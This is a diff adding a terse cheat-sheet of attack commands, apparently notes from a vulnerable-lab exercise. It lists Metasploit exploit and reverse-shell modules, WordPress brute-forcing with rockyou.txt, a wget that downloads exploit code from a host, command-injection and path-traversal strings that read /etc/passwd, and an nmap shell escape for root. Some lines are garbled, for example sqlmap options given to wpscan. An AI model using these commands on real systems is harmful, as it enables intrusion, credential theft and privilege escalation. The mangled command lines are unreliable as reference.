@@ -1,0 +1,19 @@
+badblue: exploit badblue_passthru
+unrealircd: payload/cmd/unix/reverse
+postgresql: postgre auxiliary scanner // exploit postgres_payload
+ssh: ssh auxiliary scanner // multi ssh sshexec
+tomcat: auxiliar tomcat scanner // tomcat_mgr_deploy
+Samba: auxiliary scanner enumusers // auxiliary scanner smb_login
+nikto -hosts
+wpscan -u 192.168.1.1/worpress --api-token "ajehuhr" -e
+wpscan -u 192.168.1.1/worpress -U admin -P rockyou.txt
+wordpress: wp_Admin_shell_upload
+ssh root@192.168.1.1
+wpscan --url "oiesjfrowihrfiwuhroiwrhweoij" -dbs  (--tales) -D dvwa -T users --dump 
+
+uname -a para ver la versión del kernel (40839.c)
+wordpress_login_enum (wordlists/metasploit/namelists.txt)
+wget http://192.168.1.1:8000/37292.c
+a;cat /etc/passwd (command execution)
+nmap --interactive (!sh)
+../../../../etc/passwd (file inclusion)
